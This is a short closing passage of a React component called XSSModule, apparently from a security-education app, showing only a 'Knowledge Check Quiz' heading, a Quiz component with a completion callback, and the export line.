              <Trophy className="w-6 h-6 text-yellow-400" />
              Knowledge Check Quiz
            </h3>
            <Quiz questions={quizQuestions} onComplete={() => onSectionComplete('quiz')} />
          </div>
        )}
      </div>
    </div>
  );
};

export default XSSModule;
